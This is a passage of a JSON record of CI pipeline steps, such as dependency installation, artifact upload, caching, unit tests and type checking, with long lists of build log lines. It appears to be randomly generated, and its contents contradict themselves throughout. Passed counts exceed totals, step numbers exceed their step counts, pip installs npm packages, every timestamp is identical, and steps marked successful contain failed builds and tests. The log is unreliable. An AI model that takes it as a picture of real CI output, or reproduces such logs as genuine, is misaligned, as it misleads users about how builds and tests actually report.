          "Artifact uploaded: build.tar.gz (12MB)",
          "Fetching submodules...",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Step 9/20: Deploying",
          "Step 2/25: Linting",
          "Time: 74.457s",
          "Transforming 564 files...",
          "Cache hit for key-6195",
          "Cache hit for key-6934",
          "[12:20:08] DEBUG: Loading configuration",
          "Checking out main branch",
          "Pulling image: node:18",
          "NODE_ENV=development",
          "yarn add: Done in 23.69s",
          "Connection established",
          "pip: Installing build dependencies...",
          "Connecting to example.com:443...",
          "Cache invalidated: node_modules",
          "Uploading artifact 'coverage' (43 files)",
          "Generating source maps...",
          "[12:20:08] INFO: Request completed",
          "POST /data - 202 (345ms)",
          "Transforming 114 files...",
          "Minifying main.js",
          "GET /api - 201 (83ms)",
          "[12:20:08] DEBUG: Memory usage: 137MB",
          "Verifying...",
          "Connecting to startup.dev:443...",
          "[12:20:08] DEBUG: Query executed in 58ms",
          "Generating source maps...",
          "Optimizing 74 modules...",
          "Coverage: 73% statements, 61% branches",
          "Waiting...",
          "Done.",
          "Creating production build...",
          "Layer 2/8: ENV command",
          "  PASS: e2e/test_user_create.spec.js",
          "yarn add: Done in 7.97s",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "yarn add: Done in 6.95s",
          "HEAD is now at 85f84e4",
          "Compiling lib/app.ts...",
          "Cache restored successfully (285MB)",
          "yarn add: Done in 15.91s",
          "[12:20:08] DEBUG: Initializing service",
          "Transforming 559 files...",
          "Success!",
          "npm install: resolved 1490 packages",
          "[12:20:08] INFO: Request completed",
          "Artifact uploaded: build.tar.gz (6MB)",
          "Pulling image: python:18",
          "[12:20:08] INFO: Request completed",
          "Completed.",
          "\u2713 Step 'test' succeeded",
          "Image pulled successfully",
          "Cache saved successfully",
          "Artifact uploaded: dist.zip (48MB)",
          "[12:20:08] DEBUG: Initializing service",
          "Step 18/17: Building",
          "Verifying...",
          "[12:20:08] WARN: Deprecated API usage",
          "Loading...",
          "Uploading artifact 'dist' (30 files)",
          "\u2713 Step 'checkout' succeeded",
          "  PASS: unit/test_db_connect.spec.js",
          "Ran 20 tests in 46s",
          "[12:20:08] INFO: Starting build process",
          "[12:20:08] WARN: Deprecated API usage",
          "Step 15/23: Building",
          "[12:20:08] INFO: Connecting to database",
          "Cache invalidated: dependencies",
          "Step 16/24: Deploying",
          "Creating production build...",
          "[12:20:08] WARN: Deprecated API usage",
          "  PASS: integration/test_auth_login.spec.js",
          "Already up to date.",
          "TLS handshake completed",
          "Switched to branch 'bugfix/task-580'",
          "Processing...",
          "Artifact downloaded: 10MB",
          "Minifying app.js",
          "Pushing to registry...",
          "[12:20:08] INFO: Cache refreshed",
          "HEAD is now at bb878de",
          "=== Step install_dependencies completed ==="
        ]
      },
      {
        "name": "upload_artifacts",
        "status": "success",
        "started_at": "2025-11-23T12:21:23.776085",
        "finished_at": "2025-11-23T12:21:33.174204",
        "log_lines": [
          "=== Step: upload_artifacts ===",
          "pip: Installing build dependencies...",
          "Already up to date.",
          "[12:20:08] INFO: Processing request",
          "Optimizing 59 modules...",
          "Finished.",
          "Cache hit for key-7653",
          "Using Python 3.11",
          "Transforming 770 files...",
          "pip install: Successfully installed jest-3.11",
          "\u2713 Task completed in 2978ms",
          "  PASS: e2e/test_cache_hit.spec.js",
          "Switched to branch 'hotfix/task-674'",
          "\u2717 build failed with exit code 14",
          "Time: 25.555s",
          "pip: Downloading prettier-4.2.tar.gz",
          "Environment: test",
          "pip: Installing build dependencies...",
          "WARNING: jest has known vulnerabilities",
          "Ran 141 tests in 52s",
          "FAILED: test_cache_hit",
          "Cache invalidated: node_modules",
          "Step 7/19: Deploying",
          "Step 11/24: Linting",
          "Minifying main.js",
          "\u2713 All checks passed",
          "Completed.",
          "\u2713 package completed",
          "Finished.",
          "Connection established",
          "[12:20:08] INFO: Processing request",
          "Cache miss for key-9041",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Completed.",
          "Using Node.js 17.4.4",
          "pip install: Successfully installed webpack-5.15",
          "Cache miss for key-4942",
          "Done.",
          "npm install: added 388 packages",
          "Switched to branch 'hotfix/task-823'",
          "  PASS: test_api_health (312ms)",
          "Verifying...",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "[12:20:08] WARN: Deprecated API usage",
          "Verifying...",
          "Environment: production",
          "[12:20:08] INFO: Connecting to database",
          "npm notice: package.json updated",
          "Cache saved successfully",
          "npm install: added 73 packages",
          "FAILED: test_auth_login",
          "Step 13/22: Installing dependencies",
          "Uploading artifact 'dist' (13 files)",
          "Compiling utils/handler.rs...",
          "Pushing to registry...",
          "Cache saved successfully",
          "pip: Installing build dependencies...",
          "Step 12/18: Building",
          "Waiting...",
          "\u2713 Task completed in 1152ms",
          "TLS handshake completed",
          "Completed.",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "npm install: added 62 packages",
          "HEAD is now at bb78846",
          "[12:20:08] INFO: Connecting to database",
          "Connecting to acme.corp:443...",
          "pip: Downloading express-4.15.tar.gz",
          "[12:20:08] DEBUG: Initializing service",
          "Tests: 454 passed, 471 total",
          "Exception: RuntimeError",
          "Ran 127 tests in 29s",
          "Already up to date.",
          "Ready.",
          "Step 5/19: Deploying",
          "Bundling vendor.js",
          "Image pulled successfully",
          "TLS handshake completed",
          "Platform: linux-x64",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Building Docker image...",
          "Pushing to registry...",
          "FAILED: test_api_health",
          "[12:20:08] WARN: Deprecated API usage",
          "npm install: resolved 1846 packages",
          "[12:20:08] DEBUG: Memory usage: 1406MB",
          "Installing axios@2.10.7",
          "Loading...",
          "OK",
          "Test Suites: 34 passed, 29 total",
          "Fetching submodules...",
          "Minifying main.js",
          "Cache restored successfully (283MB)",
          "[12:20:08] DEBUG: Initializing service",
          "Building Docker image...",
          "Finished.",
          "Ready.",
          "\u2717 build failed with exit code 121",
          "yarn add: Done in 20.81s",
          "\u2713 Task completed in 1864ms",
          "Step 11/17: Installing dependencies",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Creating production build...",
          "Snapshots: 7 passed, 47 total",
          "pip install: Successfully installed jest-2.10",
          "Artifact downloaded: 18MB",
          "Done.",
          "Compiling utils/service.java...",
          "Success!",
          "pip install: Successfully installed react-4.3",
          "Time: 98.64s",
          "Cache restored successfully (52MB)",
          "Connecting to test.io:443...",
          "Platform: win32-x64",
          "FAILED: test_cache_hit",
          "FAILED: test_cache_hit",
          "Compiling src/main.py...",
          "Step 7/23: Testing",
          "  PASS: e2e/test_api_health.spec.js",
          "Ready.",
          "\u2713 All checks passed",
          "[12:20:08] DEBUG: Query executed in 39ms",
          "Compiling lib/app.ts...",
          "[12:20:08] DEBUG: Memory usage: 1136MB",
          "[12:20:08] INFO: Connecting to database",
          "pip: Installing build dependencies...",
          "Time: 41.629s",
          "TLS handshake completed",
          "Compiling utils/main.py...",
          "[12:20:08] DEBUG: Loading configuration",
          "Completed.",
          "[12:20:08] WARN: Deprecated API usage",
          "[12:20:08] WARN: Deprecated API usage",
          "pip: Collecting eslint",
          "[12:20:08] DEBUG: Initializing service",
          "Compiling lib/index.js...",
          "  PASS: unit/test_api_health.spec.js",
          "Environment: production",
          "Platform: darwin-arm64",
          "Exception: NullPointerException",
          "Time: 44.478s",
          "Exception: ValueError",
          "Waiting...",
          "Exception: ValueError",
          "Switched to branch 'hotfix/task-101'",
          "\u2713 build completed",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Step 2/23: Deploying",
          "Step 3/25: Linting",
          "pip: Installing build dependencies...",
          "Pushing to registry...",
          "  PASS: integration/test_user_create.spec.js",
          "npm install: added 185 packages",
          "Artifact uploaded: dist.zip (69MB)",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Artifact uploaded: dist.zip (93MB)",
          "Connecting to acme.corp:443...",
          "[12:20:08] ERROR: Connection failed",
          "Transforming 412 files...",
          "pip: Collecting axios",
          "WARNING: webpack has known vulnerabilities",
          "Cache miss for key-1467",
          "\u2713 Task completed in 1117ms",
          "npm notice: package.json updated",
          "Compiling utils/app.ts...",
          "Exception: TypeError",
          "Installing eslint@3.5.2",
          "[12:20:08] INFO: Connecting to database",
          "npm notice: package.json updated",
          "pip: Downloading express-2.1.tar.gz",
          "Done.",
          "WARNING: eslint has known vulnerabilities",
          "Layer 3/12: COPY command",
          "[12:20:08] INFO: Cache refreshed",
          "Connection established",
          "[12:20:08] WARN: Deprecated API usage",
          "Exception: RuntimeError",
          "Creating production build...",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Uploading artifact 'dist' (28 files)",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "[12:20:08] DEBUG: Loading configuration",
          "[12:20:08] DEBUG: Initializing service",
          "\u2713 Step 'build' succeeded",
          "Cache invalidated: build",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Uploading artifact 'build' (12 files)",
          "npm install: resolved 1314 packages",
          "Uploading artifact 'dist' (25 files)",
          "Cache invalidated: build",
          "Tests: 316 passed, 283 total",
          "Processing...",
          "[12:20:08] INFO: Connecting to database",
          "POST /upload - 201 (250ms)",
          "Snapshots: 5 passed, 22 total",
          "[12:20:08] DEBUG: Initializing service",
          "Pushing to registry...",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "pip: Downloading webpack-1.16.tar.gz",
          "\u2713 lint completed",
          "Compiling utils/app.ts...",
          "Cache hit for key-7166",
          "[12:20:08] DEBUG: Loading configuration",
          "Optimizing 98 modules...",
          "Tests: 314 passed, 103 total",
          "=== Step upload_artifacts completed ==="
        ]
      },
      {
        "name": "save_cache",
        "status": "success",
        "started_at": "2025-11-23T12:21:33.174204",
        "finished_at": "2025-11-23T12:21:38.813075",
        "log_lines": [
          "=== Step: save_cache ===",
          "Cache restored successfully (466MB)",
          "Compiling src/service.java...",
          "Tests: 274 passed, 120 total",
          "Artifact downloaded: 10MB",
          "pip: Installing build dependencies...",
          "Cache invalidated: build",
          "Cache hit for key-6145",
          "Compiling lib/main.py...",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Platform: win32-x64",
          "[12:20:08] DEBUG: Loading configuration",
          "Time: 119.635s",
          "Cache restored successfully (226MB)",
          "Cache saved successfully",
          "[12:20:08] WARN: Deprecated API usage",
          "Platform: darwin-arm64",
          "Compiling src/index.js...",
          "npm notice: package.json updated",
          "Processing...",
          "  PASS: test_db_connect (274ms)",
          "Minifying vendor.js",
          "Cache miss for key-9798",
          "Processing...",
          "Artifact uploaded: dist.zip (27MB)",
          "[12:20:08] WARN: Deprecated API usage",
          "\u2713 package completed",
          "Installing webpack@4.4.9",
          "Connection established",
          "Already up to date.",
          "yarn add: Done in 21.0s",
          "Step 19/15: Testing",
          "  PASS: test_user_create (117ms)",
          "Platform: darwin-arm64",
          "Waiting...",
          "FAILED: test_db_connect",
          "Success!",
          "Completed.",
          "Using Node.js 14.3.5",
          "Installing eslint@3.4.4",
          "Platform: darwin-arm64",
          "Bundling vendor.js",
          "[12:20:08] DEBUG: Initializing service",
          "Tests: 72 passed, 469 total",
          "npm install: added 491 packages",
          "Ready.",
          "npm install: added 150 packages",
          "Switched to branch 'hotfix/task-436'",
          "npm notice: created a lockfile",
          "Ran 165 tests in 24s",
          "OK",
          "Cache miss for key-8819",
          "Exception: ValueError",
          "Building Docker image...",
          "Finished.",
          "\u2713 Task completed in 4540ms",
          "NODE_ENV=production",
          "[12:20:08] DEBUG: Loading configuration",
          "Finished.",
          "Generating source maps...",
          "Artifact uploaded: dist.zip (68MB)",
          "Tests: 307 passed, 347 total",
          "Artifact uploaded: build.tar.gz (8MB)",
          "Optimizing 98 modules...",
          "[12:20:08] INFO: Processing request",
          "Platform: darwin-arm64",
          "[12:20:08] DEBUG: Initializing service",
          "Fetching submodules...",
          "yarn add: Done in 2.4s",
          "pip: Downloading lodash-2.9.tar.gz",
          "npm notice: created a lockfile",
          "\u2713 All checks passed",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "WARNING: prettier has known vulnerabilities",
          "[12:20:08] DEBUG: Connection pool: 9 active",
          "WARNING: react has known vulnerabilities",
          "Waiting...",
          "Waiting...",
          "Platform: darwin-arm64",
          "TLS handshake completed",
          "Ran 29 tests in 52s",
          "[12:20:08] INFO: Processing request",
          "[12:20:08] ERROR: Connection failed",
          "Step 4/25: Installing dependencies",
          "Ran 42 tests in 14s",
          "Compiling lib/handler.rs...",
          "GET /health - 200 (17ms)",
          "Done.",
          "Verifying...",
          "Transforming 580 files...",
          "npm notice: created a lockfile",
          "Environment: production",
          "pip: Installing build dependencies...",
          "POST /upload - 200 (447ms)",
          "yarn add: Done in 20.69s",
          "npm notice: created a lockfile",
          "[12:20:08] ERROR: Connection failed",
          "Image pulled successfully",
          "pip install: Successfully installed prettier-2.2",
          "  PASS: e2e/test_user_create.spec.js",
          "Step 16/19: Building",
          "yarn add: Done in 9.75s",
          "Step 13/16: Building",
          "Loading...",
          "Snapshots: 25 passed, 42 total",
          "[12:20:08] WARN: Deprecated API usage",
          "Switched to branch 'hotfix/task-988'",
          "npm install: added 169 packages",
          "Compiling lib/app.ts...",
          "pip: Downloading prettier-5.13.tar.gz",
          "\u2717 build failed with exit code 113",
          "npm install: resolved 220 packages",
          "GET /health - 201 (66ms)",
          "Finished.",
          "\u2713 All checks passed",
          "OK",
          "[12:20:08] WARN: Deprecated API usage",
          "  PASS: unit/test_api_health.spec.js",
          "Uploading artifact 'coverage' (15 files)",
          "Connecting to example.com:443...",
          "Cache miss for key-6843",
          "Completed.",
          "[12:20:08] DEBUG: Query executed in 50ms",
          "Snapshots: 10 passed, 40 total",
          "Step 10/20: Deploying",
          "npm install: resolved 945 packages",
          "Ready.",
          "Snapshots: 42 passed, 43 total",
          "FAILED: test_auth_login",
          "Pulling image: alpine:18",
          "Test Suites: 12 passed, 19 total",
          "Artifact uploaded: build.tar.gz (36MB)",
          "Finished.",
          "Compiling src/service.java...",
          "Done.",
          "  PASS: e2e/test_user_create.spec.js",
          "Connecting to example.com:443...",
          "GET /api - 201 (1ms)",
          "[12:20:08] INFO: Processing request",
          "[12:20:08] DEBUG: Connection pool: 4 active",
          "Done.",
          "Using Node.js 18.4.6",
          "Compiling lib/service.java...",
          "Verifying...",
          "Fetching submodules...",
          "Tests: 275 passed, 63 total",
          "Verifying...",
          "Creating production build...",
          "OK",
          "Switched to branch 'feature/task-217'",
          "pip: Downloading express-3.13.tar.gz",
          "[12:20:08] DEBUG: Initializing service",
          "Snapshots: 3 passed, 12 total",
          "Finished.",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "WARNING: webpack has known vulnerabilities",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Step 15/20: Installing dependencies",
          "Snapshots: 18 passed, 38 total",
          "Using Node.js 14.8.5",
          "HEAD is now at 48e3b63",
          "npm install: resolved 1878 packages",
          "Cache saved successfully",
          "Minifying vendor.js",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "NODE_ENV=test",
          "POST /data - 202 (92ms)",
          "Compiling utils/service.java...",
          "Loading...",
          "pip: Collecting prettier",
          "Completed.",
          "Transforming 997 files...",
          "Cache saved successfully",
          "[12:20:08] WARN: Deprecated API usage",
          "Cache invalidated: build",
          "Pushing to registry...",
          "Exception: TypeError",
          "Time: 106.391s",
          "Waiting...",
          "pip: Collecting lodash",
          "Bundling runtime.css",
          "Connection established",
          "HEAD is now at db1dd76",
          "Finished.",
          "[12:20:08] DEBUG: Connection pool: 7 active",
          "Cache miss for key-7043",
          "[12:20:08] DEBUG: Memory usage: 563MB",
          "Step 17/19: Linting",
          "Layer 1/15: COPY command",
          "Ran 65 tests in 45s",
          "Time: 89.494s",
          "Image pulled successfully",
          "Using Node.js 20.17.3",
          "Cache miss for key-6586",
          "Minifying vendor.js",
          "OK",
          "Environment: development",
          "Creating production build...",
          "GET /api - 200 (67ms)",
          "[12:20:08] INFO: Cache refreshed",
          "Switched to branch 'feature/task-740'",
          "[12:20:08] INFO: Connecting to database",
          "[12:20:08] INFO: Cache refreshed",
          "Bundling styles.css",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "=== Step save_cache completed ==="
        ]
      },
      {
        "name": "unit_tests",
        "status": "success",
        "started_at": "2025-11-23T12:21:38.813075",
        "finished_at": "2025-11-23T12:22:07.007432",
        "log_lines": [
          "=== Step: unit_tests ===",
          "[12:20:08] INFO: Connecting to database",
          "Cache restored successfully (71MB)",
          "Building Docker image...",
          "Generating source maps...",
          "  PASS: e2e/test_api_health.spec.js",
          "[12:20:08] DEBUG: Query executed in 47ms",
          "Artifact downloaded: 30MB",
          "Cache invalidated: dependencies",
          "WARNING: jest has known vulnerabilities",
          "pip install: Successfully installed axios-5.7",
          "Connection established",
          "Image pulled successfully",
          "Creating production build...",
          "Uploading artifact 'build' (9 files)",
          "Building Docker image...",
          "Step 8/24: Testing",
          "WARNING: axios has known vulnerabilities",
          "Processing...",
          "Transforming 116 files...",
          "[12:20:08] WARN: Deprecated API usage",
          "\u2713 Step 'setup' succeeded",
          "[12:20:08] INFO: Processing request",
          "[12:20:08] DEBUG: Connection pool: 18 active",
          "Environment: staging",
          "Using Python 3.12",
          "[12:20:08] DEBUG: Loading configuration",
          "Compiling lib/index.js...",
          "Step 3/23: Building",
          "Cache saved successfully",
          "OK",
          "Completed.",
          "[12:20:08] INFO: Starting build process",
          "Loading...",
          "Connection established",
          "Step 11/17: Linting",
          "Loading...",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Generating source maps...",
          "Switched to branch 'hotfix/task-660'",
          "[12:20:08] DEBUG: Initializing service",
          "pip: Downloading jest-3.0.tar.gz",
          "Connection established",
          "Cache restored successfully (423MB)",
          "Artifact downloaded: 17MB",
          "Artifact uploaded: dist.zip (85MB)",
          "pip install: Successfully installed lodash-3.12",
          "Exception: NullPointerException",
          "Processing...",
          "Cache invalidated: build",
          "Artifact downloaded: 30MB",
          "Switched to branch 'bugfix/task-281'",
          "Step 19/24: Linting",
          "\u2713 All checks passed",
          "[12:20:08] DEBUG: Initializing service",
          "Compiling utils/utils.go...",
          "\u2717 build failed with exit code 71",
          "Building Docker image...",
          "Installing axios@1.7.8",
          "pip: Collecting jest",
          "[12:20:08] DEBUG: Loading configuration",
          "\u2713 All checks passed",
          "[12:20:08] INFO: Processing request",
          "Uploading artifact 'coverage' (17 files)",
          "[12:20:08] DEBUG: Memory usage: 1247MB",
          "[12:20:08] INFO: Processing request",
          "Processing...",
          "Verifying...",
          "FAILED: test_api_health",
          "Generating source maps...",
          "[12:20:08] INFO: Starting build process",
          "  PASS: e2e/test_cache_hit.spec.js",
          "\u2713 package completed",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "\u2717 build failed with exit code 72",
          "pip: Collecting jest",
          "WARNING: eslint has known vulnerabilities",
          "pip: Collecting axios",
          "[12:20:08] DEBUG: Memory usage: 1395MB",
          "\u2717 build failed with exit code 46",
          "Creating production build...",
          "Processing...",
          "Ready.",
          "pip: Installing build dependencies...",
          "[12:20:08] DEBUG: Loading configuration",
          "pip: Collecting express",
          "[12:20:08] INFO: Processing request",
          "Minifying app.js",
          "Step 5/24: Building",
          "Success!",
          "Platform: win32-x64",
          "  PASS: test_user_create (395ms)",
          "Fetching submodules...",
          "Processing...",
          "  PASS: integration/test_api_health.spec.js",
          "Bundling vendor.js",
          "Exception: RuntimeError",
          "GET /health - 200 (82ms)",
          "Cache miss for key-1020",
          "[12:20:08] INFO: Connecting to database",
          "  PASS: test_db_connect (4ms)",
          "npm notice: created a lockfile",
          "Step 8/23: Running migrations",
          "Step 20/20: Deploying",
          "Success!",
          "[12:20:08] DEBUG: Memory usage: 1585MB",
          "pip install: Successfully installed prettier-1.20",
          "Using Python 3.9",
          "WARNING: axios has known vulnerabilities",
          "[12:20:08] DEBUG: Initializing service",
          "[12:20:08] DEBUG: Initializing service",
          "npm install: added 187 packages",
          "Connection established",
          "pip: Downloading prettier-3.4.tar.gz",
          "Installing prettier@1.6.1",
          "npm notice: created a lockfile",
          "Uploading artifact 'build' (23 files)",
          "npm install: resolved 324 packages",
          "Artifact downloaded: 30MB",
          "Bundling vendor.css",
          "Step 1/20: Linting",
          "Snapshots: 26 passed, 40 total",
          "pip: Collecting eslint",
          "[12:20:08] INFO: Cache refreshed",
          "Compiling src/service.java...",
          "Compiling lib/service.java...",
          "Snapshots: 23 passed, 38 total",
          "NODE_ENV=test",
          "WARNING: express has known vulnerabilities",
          "\u2713 Task completed in 2264ms",
          "Test Suites: 43 passed, 7 total",
          "Compiling src/main.py...",
          "Bundling styles.js",
          "npm notice: created a lockfile",
          "Coverage: 84% statements, 95% branches",
          "[12:20:08] DEBUG: Connection pool: 1 active",
          "Building Docker image...",
          "[12:20:08] INFO: Cache refreshed",
          "Cache restored successfully (489MB)",
          "Pulling image: alpine:latest",
          "Step 2/20: Building",
          "Snapshots: 9 passed, 16 total",
          "Compiling lib/utils.go...",
          "Step 12/18: Testing",
          "Building Docker image...",
          "Processing...",
          "Using Python 3.11",
          "Platform: linux-x64",
          "npm install: resolved 430 packages",
          "POST /data - 200 (309ms)",
          "HEAD is now at 8f1828f",
          "Step 17/16: Deploying",
          "Verifying...",
          "Tests: 339 passed, 347 total",
          "Time: 75.796s",
          "Minifying vendor.js",
          "[12:20:08] ERROR: Connection failed",
          "NODE_ENV=production",
          "  PASS: test_api_health (25ms)",
          "npm notice: package.json updated",
          "Test Suites: 39 passed, 8 total",
          "WARNING: axios has known vulnerabilities",
          "\u2713 Step 'setup' succeeded",
          "WARNING: webpack has known vulnerabilities",
          "OK",
          "Artifact uploaded: build.tar.gz (35MB)",
          "Platform: darwin-arm64",
          "pip: Downloading webpack-1.17.tar.gz",
          "Checking out develop branch",
          "\u2717 build failed with exit code 110",
          "Compiling src/app.ts...",
          "[12:20:08] INFO: Processing request",
          "Step 10/22: Testing",
          "Waiting...",
          "Coverage: 98% statements, 89% branches",
          "Creating production build...",
          "WARNING: jest has known vulnerabilities",
          "Cache saved successfully",
          "HEAD is now at b0b8c71",
          "Step 5/17: Testing",
          "Ready.",
          "\u2713 Step 'build' succeeded",
          "OK",
          "Generating source maps...",
          "OK",
          "TLS handshake completed",
          "Time: 61.868s",
          "Artifact uploaded: dist.zip (95MB)",
          "Compiling lib/app.ts...",
          "Loading...",
          "TLS handshake completed",
          "Artifact uploaded: dist.zip (44MB)",
          "Step 19/17: Linting",
          "Done.",
          "Snapshots: 16 passed, 3 total",
          "Ran 97 tests in 28s",
          "Creating production build...",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "NODE_ENV=production",
          "pip install: Successfully installed webpack-1.18",
          "OK",
          "Cache saved successfully",
          "pip: Downloading eslint-4.9.tar.gz",
          "Optimizing 87 modules...",
          "OK",
          "=== Step unit_tests completed ==="
        ]
      },
      {
        "name": "type_check",
        "status": "success",
        "started_at": "2025-11-23T12:22:07.007432",
        "finished_at": "2025-11-23T12:22:16.405551",
        "log_lines": [
          "=== Step: type_check ===",
          "Cache restored successfully (116MB)",
          "Waiting...",
          "Success!",
          "[12:20:08] INFO: Cache refreshed",
          "Ready.",
          "OK",
          "  PASS: unit/test_api_health.spec.js",
          "Uploading artifact 'dist' (21 files)",
          "Verifying...",
          "Uploading artifact 'coverage' (38 files)",
          "[12:20:08] WARN: Deprecated API usage",
          "TLS handshake completed",
          "[12:20:08] INFO: Connecting to database",
          "Cache miss for key-8733",
          "Minifying app.js",
          "Time: 114.249s",
          "Connecting to cloud.services:443...",
          "Test Suites: 12 passed, 41 total",
          "[12:20:08] INFO: Connecting to database",
          "Image pulled successfully",
          "pip: Installing build dependencies...",
          "Artifact uploaded: dist.zip (42MB)",
          "\u2713 Step 'test' succeeded",
          "[12:20:08] INFO: Cache refreshed",
          "GET /api - 204 (60ms)",
          "Image pulled successfully",
          "Coverage: 91% statements, 69% branches",
          "pip: Installing build dependencies...",
          "Cache saved successfully",
          "[12:20:08] ERROR: Connection failed",
          "Cache invalidated: build",
          "Minifying vendor.js",
          "Optimizing 89 modules...",
          "  PASS: test_auth_login (149ms)",
          "[12:20:08] INFO: Cache refreshed",
          "OK",
          "Cache hit for key-3109",
          "Switched to branch 'hotfix/task-831'",
          "Building Docker image...",
          "Image pulled successfully",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "[12:20:08] DEBUG: Loading configuration",
          "[12:20:08] INFO: Connecting to database",
          "Uploading artifact 'dist' (7 files)",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Done.",
          "Step 19/20: Running migrations",
          "Artifact downloaded: 45MB",
          "TLS handshake completed",
          "[12:20:08] ERROR: Connection failed",
          "\u2713 Task completed in 208ms",
          "[12:20:08] DEBUG: Query executed in 2ms",
          "Minifying main.js",
          "Installing express@2.20.2",
          "Transforming 791 files...",
          "Compiling lib/service.java...",
          "Step 9/19: Deploying",
          "Success!",
          "Ready.",
          "Uploading artifact 'dist' (50 files)",
          "pip: Installing build dependencies...",
          "Uploading artifact 'build' (21 files)",
          "OK",
          "Generating source maps...",
          "  PASS: test_cache_hit (327ms)",
          "FAILED: test_auth_login",
          "Snapshots: 49 passed, 11 total",
          "Artifact uploaded: dist.zip (69MB)",
          "  PASS: e2e/test_user_create.spec.js",
          "Generating source maps...",
          "[12:20:08] DEBUG: Loading configuration",
          "Time: 54.705s",
          "yarn add: Done in 7.82s",
          "pip: Installing build dependencies...",
          "[12:20:08] INFO: Connecting to database",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "OK",
          "Loading...",
          "pip: Downloading react-5.1.tar.gz",
          "Step 6/16: Running migrations",
          "Generating source maps...",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "WARNING: axios has known vulnerabilities",
          "WARNING: express has known vulnerabilities",
          "[12:20:08] INFO: Processing request",
          "[12:20:08] INFO: Connecting to database",
          "Tests: 387 passed, 249 total",
          "Connecting to startup.dev:443...",
          "pip install: Successfully installed express-2.9",
          "Verifying...",
          "HEAD is now at 34a8e52",
          "pip: Installing build dependencies...",
          "Environment: production",
          "[12:20:08] WARN: Deprecated API usage",
          "Checking out master branch",
          "[12:20:08] ERROR: Connection failed",
          "  PASS: test_db_connect (362ms)",
          "Cache hit for key-7091",
          "Exception: TypeError",
          "npm install: added 492 packages",
          "[12:20:08] INFO: Connecting to database",
          "Connection established",
          "Pulling image: node:latest",
          "pip: Installing build dependencies...",
          "Connecting to cloud.services:443...",
          "Time: 73.958s",
          "[12:20:08] DEBUG: Initializing service",
          "Cache saved successfully",
          "Artifact downloaded: 37MB",
          "GET /api - 200 (98ms)",
          "Platform: darwin-arm64",
          "WARNING: webpack has known vulnerabilities",
          "[12:20:08] INFO: Starting build process",
          "[12:20:08] DEBUG: Loading configuration",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "[12:20:08] ERROR: Connection failed",
          "Pulling image: alpine:latest",
          "Compiling lib/main.py...",
          "Waiting...",
          "[12:20:08] INFO: Request completed",
          "Layer 5/11: RUN command",
          "Generating source maps...",
          "Ran 29 tests in 60s",
          "Cache invalidated: build",
          "[12:20:08] INFO: Connecting to database",
          "Image pulled successfully",
          "Creating production build...",
          "Step 5/20: Running migrations",
          "\u2713 deploy completed",
          "pip install: Successfully installed webpack-1.9",
          "Coverage: 71% statements, 81% branches",
          "WARNING: prettier has known vulnerabilities",
          "Cache invalidated: node_modules",
          "Compiling src/index.js...",
          "Using Python 3.12",
          "npm install: resolved 815 packages",
          "Verifying...",
          "Connecting to example.com:443...",
          "npm notice: created a lockfile",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "[12:20:08] INFO: Processing request",
          "Layer 3/15: RUN command",
          "Loading...",
          "Uploading artifact 'coverage' (14 files)",
          "Using Node.js 14.6.4",
          "\u2713 Step 'setup' succeeded",
          "[12:20:08] INFO: Cache refreshed",
          "Artifact downloaded: 17MB",
          "[12:20:08] DEBUG: Query executed in 7ms",
          "Using Python 3.12",
          "pip install: Successfully installed react-2.7",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Installing eslint@4.16.8",
          "\u2717 build failed with exit code 7",
          "Step 12/15: Deploying",
          "Time: 119.489s",
          "Artifact uploaded: dist.zip (7MB)",
          "Transforming 717 files...",
          "Bundling vendor.js",
          "Ran 105 tests in 43s",
          "Step 15/17: Running migrations",
          "Bundling styles.js",
          "[12:20:08] INFO: Request completed",
          "npm install: added 138 packages",
          "[12:20:08] INFO: Processing request",
          "Completed.",
          "Done.",
          "Step 5/18: Installing dependencies",
          "\u2713 Step 'checkout' succeeded",
          "Waiting...",
          "Step 20/21: Linting",
          "[12:20:08] WARN: Deprecated API usage",
          "Artifact uploaded: dist.zip (62MB)",
          "Step 4/19: Deploying",
          "OK",
          "WARNING: eslint has known vulnerabilities",
          "Step 2/24: Installing dependencies",
          "Checking out develop branch",
          "Compiling utils/handler.rs...",
          "Cache invalidated: build",
          "Cache miss for key-3541",
          "NODE_ENV=production",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Minifying main.js",
          "[12:20:08] DEBUG: Initializing service",
          "Compiling lib/index.js...",
          "Step 4/22: Linting",
          "[12:20:08] INFO: Cache refreshed",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Ran 133 tests in 32s",
          "\u2713 Step 'install' succeeded",
          "HEAD is now at 9eca579",
          "pip: Downloading webpack-2.16.tar.gz",
          "Fetching submodules...",
          "Artifact uploaded: dist.zip (46MB)",
          "Artifact uploaded: build.tar.gz (22MB)",
          "Cache restored successfully (334MB)",
          "Success!",
          "Compiling src/main.py...",
